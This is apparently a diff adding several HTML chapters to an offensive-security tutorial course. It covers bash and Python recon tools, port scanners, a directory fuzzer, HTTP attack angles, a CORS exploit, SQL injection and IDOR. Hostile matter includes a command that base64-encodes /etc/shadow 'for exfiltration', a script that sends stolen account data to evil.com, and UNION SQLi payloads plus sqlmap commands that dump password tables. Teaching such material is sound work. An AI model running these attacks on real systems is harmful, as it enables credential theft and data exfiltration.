+<span class="ck">xxd</span> suspicious_file | head -20  <span class="cm"># hex dump — identify file type by magic bytes</span><br>
+<span class="ck">echo</span> <span class="cs">"dGVzdA=="</span> | base64 -d       <span class="cm"># decode base64 string</span><br>
+<span class="ck">cat</span> /etc/shadow | base64         <span class="cm"># encode for exfiltration over limited channels</span><br>
+<span class="ck">base64</span> -d &lt;&lt;&lt;<span class="cs">"$(cat encoded.txt)"</span> &gt; decoded_binary  <span class="cm"># decode and save</span>
+</div></div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch05')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 05 — Permissions & PrivEsc</div></div>
+  <div class="nav-btn next" onclick="show('ch07')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 07 — Bash Scripting</div></div>
+</div>
+</div>
+
+<!-- CH 07-18: Full content chapters -->
+<div class="chapter" id="ch07">
+<div class="ch-header"><span class="ch-phase ph1">Phase 1 — Foundations</span><h1 class="ch-title">Chapter 07 — Bash Scripting for Hackers</h1><p class="ch-sub">Script Anatomy · Loops · Functions · 4 Complete Real Tools</p></div>
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Running commands manually one at a time is slow and error-prone. Scripts automate reconnaissance, build custom tools, and chain exploits together into repeatable workflows.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">Bash is a command interpreter that reads text files line by line, executing commands, evaluating conditions, and controlling flow with loops and functions — running as a process under the Linux kernel.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">Reconnaissance automation, custom port scanners, log parsers, reverse shell generators, payload wrappers. Every real pentester writes bash daily.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">During recon (automate scanning), post-exploitation (exfiltration scripts), and tool building (before Python gets involved for complexity).</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Every security professional on Linux. Automation is the difference between a productive pentester and someone who manually types the same commands for hours.</div></div>
+</div>
+
+<div class="sec"><h2>Script Anatomy — Internals</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash</span></div>
+<div class="code-body">
+<span class="cs">#!/bin/bash</span>          <span class="cm"># shebang: kernel uses this to find the interpreter</span><br>
+<span class="ck">set</span> -e               <span class="cm"># exit immediately if any command fails</span><br>
+<span class="ck">set</span> -u               <span class="cm"># treat unset variables as errors (catches typos)</span><br>
+<span class="ck">set</span> -o pipefail      <span class="cm"># pipe failure propagates — cmd1 | cmd2 fails if cmd1 fails</span><br>
+<span class="ck">IFS</span>=$<span class="cs">'\n\t'</span>          <span class="cm"># safer word splitting — handles spaces in filenames</span><br>
+<br>
+<span class="cm"># Variables</span><br>
+TARGET=<span class="cs">"192.168.1.100"</span>  <span class="cm"># no spaces around = sign</span><br>
+PORT=<span class="cv">$1</span>               <span class="cm"># $1 = first argument passed to script</span><br>
+ALL_ARGS=<span class="cs">"$@"</span>         <span class="cm"># "$@" = all args, properly quoted</span><br>
+<br>
+<span class="cm"># Command substitution</span><br>
+KERNEL=<span class="cs">$(</span><span class="ck">uname</span> -r<span class="cs">)</span>    <span class="cm"># execute command, capture output into variable</span><br>
+DATE=<span class="cs">$(</span><span class="ck">date</span> +%Y%m%d<span class="cs">)</span>  <span class="cm"># format: 20240101</span>
+</div></div>
+
+<div class="sec"><h2>Complete Tool 1: auto_recon.sh</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — auto_recon.sh</span></div>
+<div class="code-body">
+<span class="cs">#!/bin/bash</span><br>
+<span class="cm"># auto_recon.sh — Automated target reconnaissance</span><br>
+<span class="cm"># Usage: ./auto_recon.sh 192.168.1.100</span><br>
+<span class="ck">set</span> -euo pipefail<br>
+<br>
+TARGET=<span class="cv">$1</span>                             <span class="cm"># target IP from argument</span><br>
+OUTPUT=<span class="cs">"recon_</span><span class="cv">${TARGET}</span><span class="cs">_</span><span class="cv">$(date +%Y%m%d_%H%M)</span><span class="cs">"</span>  <span class="cm"># unique output dir</span><br>
+<span class="ck">mkdir</span> -p <span class="cv">$OUTPUT</span>                     <span class="cm"># create output directory</span><br>
+<br>
+<span class="cm"># Color output functions</span><br>
+GREEN=<span class="cs">'\033[0;32m'</span>; RED=<span class="cs">'\033[0;31m'</span>; NC=<span class="cs">'\033[0m'</span><br>
+<span class="ck">log</span>() { <span class="ck">echo</span> -e <span class="cs">"${GREEN}[+]${NC} $1"</span>; }<br>
+<span class="ck">err</span>() { <span class="ck">echo</span> -e <span class="cs">"${RED}[-]${NC} $1"</span>; }<br>
+<br>
+log <span class="cs">"Starting recon on </span><span class="cv">$TARGET</span><span class="cs">"</span><br>
+<br>
+<span class="cm"># Phase 1: Quick port scan</span><br>
+log <span class="cs">"Running quick Nmap scan..."</span><br>
+nmap -sV -T4 --open -oN <span class="cs">"</span><span class="cv">$OUTPUT</span><span class="cs">/quick_scan.txt"</span> <span class="cv">$TARGET</span><br>
+<span class="cm"># -sV = service version detection</span><br>
+<span class="cm"># -T4 = aggressive timing</span><br>
+<span class="cm"># --open = only show open ports</span><br>
+<span class="cm"># -oN = normal output to file</span><br>
+<br>
+<span class="cm"># Phase 2: Full port scan in background</span><br>
+log <span class="cs">"Starting full port scan in background..."</span><br>
+nmap -p- -T4 --open -oN <span class="cs">"</span><span class="cv">$OUTPUT</span><span class="cs">/full_scan.txt"</span> <span class="cv">$TARGET</span> &amp;<br>
+FULLSCAN_PID=$!  <span class="cm"># capture background process PID</span><br>
+<br>
+<span class="cm"># Phase 3: Check for HTTP service</span><br>
+<span class="ck">for</span> PORT <span class="ck">in</span> 80 443 8080 8443; <span class="ck">do</span><br>
+&nbsp;&nbsp;<span class="ck">if</span> nc -z -w2 <span class="cv">$TARGET</span> <span class="cv">$PORT</span> 2&gt;/dev/null; <span class="ck">then</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;log <span class="cs">"HTTP found on port </span><span class="cv">$PORT</span><span class="cs"> — running Gobuster..."</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;gobuster dir -u <span class="cs">"http://</span><span class="cv">${TARGET}</span><span class="cs">:</span><span class="cv">${PORT}</span><span class="cs">"</span> \<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-w /usr/share/wordlists/dirb/common.txt \<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-o <span class="cs">"</span><span class="cv">$OUTPUT</span><span class="cs">/gobuster_</span><span class="cv">${PORT}</span><span class="cs">.txt"</span> \<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-q 2&gt;/dev/null<br>
+&nbsp;&nbsp;<span class="ck">fi</span><br>
+<span class="ck">done</span><br>
+<br>
+<span class="cm"># Phase 4: Check for SMB</span><br>
+<span class="ck">if</span> nc -z -w2 <span class="cv">$TARGET</span> <span class="cv">445</span> 2&gt;/dev/null; <span class="ck">then</span><br>
+&nbsp;&nbsp;log <span class="cs">"SMB port 445 open — running enum4linux..."</span><br>
+&nbsp;&nbsp;enum4linux -a <span class="cv">$TARGET</span> &gt; <span class="cs">"</span><span class="cv">$OUTPUT</span><span class="cs">/smb_enum.txt"</span> 2&gt;/dev/null<br>
+<span class="ck">fi</span><br>
+<br>
+<span class="cm"># Wait for background full scan</span><br>
+<span class="ck">wait</span> <span class="cv">$FULLSCAN_PID</span> &amp;&amp; log <span class="cs">"Full scan complete"</span> || err <span class="cs">"Full scan failed"</span><br>
+log <span class="cs">"Recon complete. Results in: </span><span class="cv">$OUTPUT</span><span class="cs">/"</span>
+</div></div>
+
+<div class="sec"><h2>Complete Tool 2: net_scan.sh — Pure Bash Port Scanner</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — net_scan.sh (no nmap needed)</span></div>
+<div class="code-body">
+<span class="cs">#!/bin/bash</span><br>
+<span class="cm"># net_scan.sh — Port scanner using /dev/tcp (pure bash, no nmap)</span><br>
+<span class="cm"># Usage: ./net_scan.sh 192.168.1.100 1 1000</span><br>
+<br>
+HOST=<span class="cv">$1</span>; START=<span class="cv">$2</span>; END=<span class="cv">$3</span><br>
+TIMEOUT=1  <span class="cm"># 1 second timeout per port</span><br>
+<br>
+<span class="ck">echo</span> <span class="cs">"Scanning </span><span class="cv">$HOST</span><span class="cs"> ports </span><span class="cv">$START</span><span class="cs">-</span><span class="cv">$END</span><span class="cs">"</span><br>
+<br>
+<span class="ck">for</span> PORT <span class="ck">in</span> <span class="cs">$(</span><span class="ck">seq</span> <span class="cv">$START</span> <span class="cv">$END</span><span class="cs">)</span>; <span class="ck">do</span><br>
+&nbsp;&nbsp;<span class="cm"># /dev/tcp/HOST/PORT is a bash built-in — bash handles TCP directly</span><br>
+&nbsp;&nbsp;<span class="cm"># timeout kills the attempt if it takes too long</span><br>
+&nbsp;&nbsp;<span class="cm"># 2>/dev/null silences errors (connection refused = port closed)</span><br>
+&nbsp;&nbsp;(<span class="ck">echo</span> &gt; /dev/tcp/<span class="cv">$HOST</span>/<span class="cv">$PORT</span>) &gt;/dev/null 2&gt;&amp;1 &amp;<br>
+&nbsp;&nbsp;PID=$!<br>
+&nbsp;&nbsp;<span class="ck">sleep</span> <span class="cv">$TIMEOUT</span> &amp; SPID=$!<br>
+&nbsp;&nbsp;<span class="ck">wait</span> -n 2&gt;/dev/null && <span class="ck">echo</span> <span class="cs">"OPEN: </span><span class="cv">$PORT</span><span class="cs">"</span><br>
+&nbsp;&nbsp;<span class="ck">kill</span> <span class="cv">$PID</span> <span class="cv">$SPID</span> 2&gt;/dev/null<br>
+<span class="ck">done</span><br>
+<br>
+<span class="cm"># Faster version — parallel with 50 simultaneous checks:</span><br>
+<span class="ck">scan_port</span>() {<br>
+&nbsp;&nbsp;(<span class="ck">echo</span> &gt; /dev/tcp/<span class="cv">$HOST</span>/<span class="cv">$1</span>) &gt;&amp;2 2&gt;/dev/null && <span class="ck">echo</span> <span class="cs">"OPEN: $1"</span><br>
+}<br>
+<span class="ck">export</span> -f scan_port; <span class="ck">export</span> HOST<br>
+<span class="ck">seq</span> <span class="cv">$START</span> <span class="cv">$END</span> | xargs -P50 -I{} bash -c <span class="cs">'scan_port {}'</span><br>
+<span class="cm"># xargs -P50 = run 50 parallel processes</span>
+</div></div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch06')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 06 — 50 Linux Commands</div></div>
+  <div class="nav-btn next" onclick="show('ch08')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 08 — Python for Security</div></div>
+</div>
+</div>
+
+<!-- CH08 -->
+<div class="chapter" id="ch08">
+<div class="ch-header"><span class="ch-phase ph2">Phase 2 — Web & Network</span><h1 class="ch-title">Chapter 08 — Python for Security</h1><p class="ch-sub">Port Scanner · Directory Fuzzer · Packet Crafting · Key Libraries</p></div>
+<div class="sec"><h2>Threaded Port Scanner from Scratch</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">python3 — port_scanner.py</span></div>
+<div class="code-body">
+<span class="cm">#!/usr/bin/env python3</span><br>
+<span class="cm"># Threaded port scanner with banner grabbing</span><br>
+<span class="ck">import</span> socket<br>
+<span class="ck">import</span> sys<br>
+<span class="ck">from</span> concurrent.futures <span class="ck">import</span> ThreadPoolExecutor<br>
+<span class="ck">from</span> datetime <span class="ck">import</span> datetime<br>
+<br>
+<span class="ck">def</span> <span class="cv">grab_banner</span>(sock):<br>
+&nbsp;&nbsp;<span class="cm">"""Try to grab service banner after connection"""</span><br>
+&nbsp;&nbsp;<span class="ck">try</span>:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.settimeout(<span class="cv">2</span>)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># Send HTTP request — many services respond to this</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.send(<span class="cs">b"HEAD / HTTP/1.0\r\nHost: x\r\n\r\n"</span>)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">return</span> sock.recv(<span class="cv">1024</span>).decode(<span class="cs">'utf-8'</span>, errors=<span class="cs">'ignore'</span>).strip()<br>
+&nbsp;&nbsp;<span class="ck">except</span>:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">return</span> <span class="cs">""</span><br>
+<br>
+<span class="ck">def</span> <span class="cv">scan_port</span>(target, port):<br>
+&nbsp;&nbsp;<span class="cm">"""Attempt TCP connection to target:port"""</span><br>
+&nbsp;&nbsp;<span class="ck">try</span>:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># AF_INET = IPv4, SOCK_STREAM = TCP</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.settimeout(<span class="cv">1</span>)  <span class="cm"># 1 second timeout per port</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;result = sock.connect_ex((target, port))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># connect_ex returns 0 on success, error code otherwise</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">if</span> result == <span class="cv">0</span>:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;banner = grab_banner(sock)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sock.close()<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">return</span> (port, <span class="cs">'OPEN'</span>, banner)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.close()<br>
+&nbsp;&nbsp;<span class="ck">except</span> socket.gaierror:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(<span class="cs">"Hostname could not be resolved"</span>)<br>
+&nbsp;&nbsp;<span class="ck">return</span> <span class="cv">None</span><br>
+<br>
+<span class="ck">def</span> <span class="cv">main</span>():<br>
+&nbsp;&nbsp;target = sys.argv[<span class="cv">1</span>]  <span class="cm"># target from command line</span><br>
+&nbsp;&nbsp;start_port = <span class="cv">int</span>(sys.argv[<span class="cv">2</span>]) <span class="ck">if</span> len(sys.argv) > <span class="cv">2</span> <span class="ck">else</span> <span class="cv">1</span><br>
+&nbsp;&nbsp;end_port   = <span class="cv">int</span>(sys.argv[<span class="cv">3</span>]) <span class="ck">if</span> len(sys.argv) > <span class="cv">3</span> <span class="ck">else</span> <span class="cv">1000</span><br>
+<br>
+&nbsp;&nbsp;<span class="cv">print</span>(<span class="cs">f"Scanning {target} ports {start_port}-{end_port}"</span>)<br>
+&nbsp;&nbsp;start_time = datetime.now()<br>
+<br>
+&nbsp;&nbsp;<span class="cm"># ThreadPoolExecutor runs scan_port concurrently</span><br>
+&nbsp;&nbsp;<span class="cm"># max_workers=500 = 500 simultaneous connections</span><br>
+&nbsp;&nbsp;<span class="ck">with</span> ThreadPoolExecutor(max_workers=<span class="cv">500</span>) <span class="ck">as</span> executor:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;futures = [executor.submit(scan_port, target, port)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="ck">for</span> port <span class="ck">in</span> range(start_port, end_port + <span class="cv">1</span>)]<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">for</span> future <span class="ck">in</span> futures:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result = future.result()<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">if</span> result:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port, status, banner = result<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cv">print</span>(<span class="cs">f"[+] Port {port}: {status}"</span>)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">if</span> banner: <span class="cv">print</span>(<span class="cs">f"    Banner: {banner[:80]}"</span>)<br>
+<br>
+&nbsp;&nbsp;<span class="cv">print</span>(<span class="cs">f"Scan completed in {datetime.now() - start_time}"</span>)<br>
+<br>
+<span class="ck">if</span> __name__ == <span class="cs">"__main__"</span>:<br>
+&nbsp;&nbsp;main()<br>
+<span class="cm"># Usage: python3 port_scanner.py 192.168.1.100 1 65535</span>
+</div></div>
+
+<div class="sec"><h2>Directory Fuzzer</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">python3 — dir_fuzzer.py</span></div>
+<div class="code-body">
+<span class="cm">#!/usr/bin/env python3</span><br>
+<span class="ck">import</span> requests<br>
+<span class="ck">import</span> sys<br>
+<span class="ck">from</span> concurrent.futures <span class="ck">import</span> ThreadPoolExecutor<br>
+<span class="ck">from</span> urllib3.exceptions <span class="ck">import</span> InsecureRequestWarning<br>
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>
+<br>
+<span class="ck">def</span> <span class="cv">check_path</span>(base_url, word):<br>
+&nbsp;&nbsp;url = <span class="cs">f"{base_url.rstrip('/')}/{word.strip()}"</span><br>
+&nbsp;&nbsp;<span class="ck">try</span>:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># verify=False = ignore SSL cert errors (common in internal apps)</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># allow_redirects=False = catch 302 redirects (may indicate valid paths)</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url, timeout=<span class="cv">3</span>, verify=<span class="cv">False</span>, allow_redirects=<span class="cv">False</span>)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">if</span> r.status_code <span class="ck">not in</span> [<span class="cv">404</span>, <span class="cv">400</span>]:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cm"># Print any non-404 response (200, 301, 302, 403 = all interesting)</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cv">print</span>(<span class="cs">f"[{r.status_code}] {url} ({len(r.content)} bytes)"</span>)<br>
+&nbsp;&nbsp;<span class="ck">except</span> requests.exceptions.RequestException:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="ck">pass</span>  <span class="cm"># connection error — skip silently</span><br>
+<br>
+base_url = sys.argv[<span class="cv">1</span>]   <span class="cm"># e.g. http://target.com</span><br>
+wordlist = sys.argv[<span class="cv">2</span>]   <span class="cm"># e.g. /usr/share/wordlists/dirb/common.txt</span><br>
+<br>
+<span class="ck">with</span> open(wordlist) <span class="ck">as</span> f:<br>
+&nbsp;&nbsp;words = f.readlines()<br>
+<br>
+<span class="cv">print</span>(<span class="cs">f"Fuzzing {base_url} with {len(words)} words..."</span>)<br>
+<br>
+<span class="ck">with</span> ThreadPoolExecutor(max_workers=<span class="cv">50</span>) <span class="ck">as</span> ex:<br>
+&nbsp;&nbsp;ex.map(<span class="ck">lambda</span> w: check_path(base_url, w), words)<br>
+<span class="cm"># Usage: python3 dir_fuzzer.py http://192.168.1.100 /usr/share/wordlists/dirb/common.txt</span>
+</div></div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch07')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 07 — Bash Scripting</div></div>
+  <div class="nav-btn next" onclick="show('ch09')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 09 — Web & HTTP</div></div>
+</div>
+</div>
+
+<!-- Remaining chapters as full content -->
+<div class="chapter" id="ch09">
+<div class="ch-header"><span class="ch-phase ph2">Phase 2 — Web & Network</span><h1 class="ch-title">Chapter 09 — Web Technologies & HTTP</h1><p class="ch-sub">Full Request/Response Anatomy · Security Headers · Cookies · CORS · SOP</p></div>
+<div class="sec"><h2>Complete HTTP Request Anatomy</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">HTTP Request — Every Header Explained</span></div>
+<div class="code-body">
+<span class="co">POST /api/login HTTP/1.1</span>                  <span class="cm">← Method, path, HTTP version</span><br>
+<span class="cv">Host:</span> <span class="cs">www.target.com</span>                      <span class="cm">← REQUIRED. Which vhost to route to</span><br>
+<span class="cv">User-Agent:</span> <span class="cs">Mozilla/5.0 (Kali Linux)</span>       <span class="cm">← Client identifier (easily spoofed)</span><br>
+<span class="cv">Content-Type:</span> <span class="cs">application/json</span>            <span class="cm">← Body format. Change to bypass type checks</span><br>
+<span class="cv">Content-Length:</span> <span class="cs">38</span>                         <span class="cm">← Body size in bytes</span><br>
+<span class="cv">Authorization:</span> <span class="cs">Bearer eyJhbGciOiJIUzI1...</span> <span class="cm">← JWT token — target for attacks</span><br>
+<span class="cv">Cookie:</span> <span class="cs">session=abc123; csrf=xyz789</span>        <span class="cm">← Cookies sent to server</span><br>
+<span class="cv">Origin:</span> <span class="cs">https://www.target.com</span>             <span class="cm">← CORS origin check — spoof to test CORS</span><br>
+<span class="cv">Referer:</span> <span class="cs">https://www.target.com/login</span>      <span class="cm">← Previous page — used for CSRF validation</span><br>
+<span class="cv">X-Forwarded-For:</span> <span class="cs">127.0.0.1</span>              <span class="cm">← Claimed client IP — often trusted blindly</span><br>
+<span class="cv">X-Real-IP:</span> <span class="cs">10.0.0.1</span>                      <span class="cm">← Alternative IP spoofing header</span><br>
+<br>
+<span class="cs">{"username":"admin","password":"test"}</span>   <span class="cm">← Request body</span><br>
+<br>
+<span class="cm">ATTACK ANGLES:</span><br>
+<span class="cm"># X-Forwarded-For: 127.0.0.1 → bypass IP whitelist (admin panel)</span><br>
+<span class="cm"># Content-Type: text/xml → change to trigger XXE parser</span><br>
+<span class="cm"># Authorization: tamper JWT → algorithm confusion, none attack</span>
+</div></div>
+
+<div class="sec"><h2>Security Headers — What Their Absence Means</h2></div>
+<table class="tbl">
+<tr><th>Header</th><th>Purpose</th><th>Missing = Vulnerability</th></tr>
+<tr><td><span class="ic">Content-Security-Policy</span></td><td>Whitelist trusted script/style sources</td><td>XSS scripts can load from any domain</td></tr>
+<tr><td><span class="ic">Strict-Transport-Security</span></td><td>Force HTTPS for N seconds</td><td>SSL stripping / downgrade attacks work</td></tr>
+<tr><td><span class="ic">X-Frame-Options</span></td><td>Block iframe embedding</td><td>Clickjacking attacks possible</td></tr>
+<tr><td><span class="ic">X-Content-Type-Options: nosniff</span></td><td>Prevent MIME sniffing</td><td>Browser may execute malicious uploaded files</td></tr>
+<tr><td><span class="ic">Set-Cookie: HttpOnly</span></td><td>Block JS access to cookies</td><td>XSS can steal session cookies via document.cookie</td></tr>
+<tr><td><span class="ic">Set-Cookie: Secure</span></td><td>Only send cookie over HTTPS</td><td>Cookies exposed in HTTP traffic</td></tr>
+<tr><td><span class="ic">Set-Cookie: SameSite=Strict</span></td><td>Block cross-site cookie sending</td><td>CSRF attacks work without additional tokens</td></tr>
+</table>
+
+<div class="sec"><h2>CORS Misconfiguration — Attack & Exploit</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">HTTP + JavaScript — CORS Attack</span></div>
+<div class="code-body">
+<span class="cm"># Test: Send request with arbitrary Origin header</span><br>
+<span class="ck">curl</span> -H <span class="cs">"Origin: https://evil.com"</span> https://api.target.com/user/data -v<br>
+<br>
+<span class="cm"># Vulnerable response (reflects ANY origin):</span><br>
+<span class="cv">Access-Control-Allow-Origin:</span> <span class="cs">https://evil.com</span>  <span class="cm">← reflects attacker origin!</span><br>
+<span class="cv">Access-Control-Allow-Credentials:</span> <span class="cs">true</span>         <span class="cm">← allows cookies to be sent</span><br>
+<br>
+<span class="cm"># Exploitation — attacker hosts this page on evil.com:</span><br>
+<span class="cs">&lt;script&gt;</span><br>
+<span class="ck">fetch</span>(<span class="cs">'https://api.target.com/user/data'</span>, {<br>
+&nbsp;&nbsp;credentials: <span class="cs">'include'</span>  <span class="cm">// send victim's cookies</span><br>
+})<br>
+.<span class="ck">then</span>(r =&gt; r.text())<br>
+.<span class="ck">then</span>(data =&gt; {<br>
+&nbsp;&nbsp;<span class="cm">// Send victim's account data to attacker server</span><br>
+&nbsp;&nbsp;<span class="ck">fetch</span>(<span class="cs">'https://evil.com/steal?d='</span> + btoa(data))<br>
+})<br>
+<span class="cs">&lt;/script&gt;</span><br>
+<br>
+<span class="cm"># Victim visits evil.com → their authenticated request goes to target.com</span><br>
+<span class="cm"># → response returned to evil.com → attacker has victim's data</span>
+</div></div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch08')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 08 — Python</div></div>
+  <div class="nav-btn next" onclick="show('ch10')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 10 — OWASP Top 10</div></div>
+</div>
+</div>
+
+<!-- CH10-18 rapid full content -->
+<div class="chapter" id="ch10">
+<div class="ch-header"><span class="ch-phase ph2">Phase 2 — Web & Network</span><h1 class="ch-title">Chapter 10 — OWASP Top 10 Deep Dive</h1><p class="ch-sub">All 10 Categories · SQLi · IDOR · SSRF · JWT · Real Attack Walkthroughs</p></div>
+<div class="sec"><h2>A03: Injection — SQL Injection Deep Dive</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">SQL + HTTP — Full SQLi Attack Chain</span></div>
+<div class="code-body">
+<span class="cm"># Vulnerable PHP code (what NOT to do):</span><br>
+<span class="cv">$query</span> = <span class="cs">"SELECT * FROM users WHERE username='"</span> . <span class="cv">$_GET</span>[<span class="cs">'user'</span>] . <span class="cs">"'"</span>;<br>
+<span class="cm"># User input directly concatenated — no sanitisation</span><br>
+<br>
+<span class="cm"># ── Step 1: Detect SQLi ───────────────────────────────────────────</span><br>
+<span class="cm"># Input: ' → causes SQL error if vulnerable</span><br>
+<span class="ck">curl</span> <span class="cs">"http://target.com/users?user='"</span><br>
+<span class="cm"># Response: "You have an error in your SQL syntax..." = SQLi confirmed</span><br>
+<br>
+<span class="cm"># ── Step 2: Determine number of columns ──────────────────────────</span><br>
+<span class="cm"># Input: ' ORDER BY 1-- -</span><br>
+<span class="cm"># Keep incrementing until error: ' ORDER BY 4-- - → error = 3 columns</span><br>
+<br>
+<span class="cm"># ── Step 3: UNION-based extraction ───────────────────────────────</span><br>
+<span class="cm"># Find which columns are displayed:</span><br>
+<span class="cm"># ' UNION SELECT 'a','b','c'-- -</span><br>
+<span class="cm"># Look for 'a', 'b', or 'c' in page output</span><br>
+<br>
+<span class="cm"># ── Step 4: Extract database info ────────────────────────────────</span><br>
+<span class="cm"># Get current database name:</span><br>
+<span class="cm"># ' UNION SELECT database(),2,3-- -</span><br>
+<br>
+<span class="cm"># Get all table names:</span><br>
+<span class="cm"># ' UNION SELECT table_name,2,3 FROM information_schema.tables</span><br>
+<span class="cm">#   WHERE table_schema=database()-- -</span><br>
+<br>
+<span class="cm"># Get column names from users table:</span><br>
+<span class="cm"># ' UNION SELECT column_name,2,3 FROM information_schema.columns</span><br>
+<span class="cm">#   WHERE table_name='users'-- -</span><br>
+<br>
+<span class="cm"># Dump all usernames and passwords:</span><br>
+<span class="cm"># ' UNION SELECT username,password,3 FROM users-- -</span><br>
+<br>
+<span class="cm"># ── Automate with sqlmap ──────────────────────────────────────────</span><br>
+<span class="ck">sqlmap</span> -u <span class="cs">"http://target.com/users?user=1"</span> --dbs<br>
+<span class="ck">sqlmap</span> -u <span class="cs">"http://target.com/users?user=1"</span> -D targetdb --tables<br>
+<span class="ck">sqlmap</span> -u <span class="cs">"http://target.com/users?user=1"</span> -D targetdb -T users --dump<br>
+<span class="cm"># With cookies (authenticated SQLi):</span><br>
+<span class="ck">sqlmap</span> -u <span class="cs">"http://target.com/account"</span> --cookie=<span class="cs">"session=abc123"</span> --data=<span class="cs">"id=1"</span> --dbs
+</div></div>
+
+<div class="sec"><h2>A01: Broken Access Control — IDOR</h2></div>
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">HTTP — IDOR Attack</span></div>
+<div class="code-body">
+<span class="cm"># You log in as user alice (user_id=1001) and see your profile:</span><br>
+<span class="cm">GET /api/users/1001/profile</span><br>
+<span class="cm">Authorization: Bearer alice_token</span><br>
+<br>
+<span class="cm"># IDOR: change the ID to access another user's data</span><br>
+<span class="cm">GET /api/users/1002/profile   ← bob's profile</span><br>
+<span class="cm">Authorization: Bearer alice_token  ← still alice's token</span><br>
+<br>
+<span class="cm"># If server returns bob's data → IDOR vulnerability!</span><br>
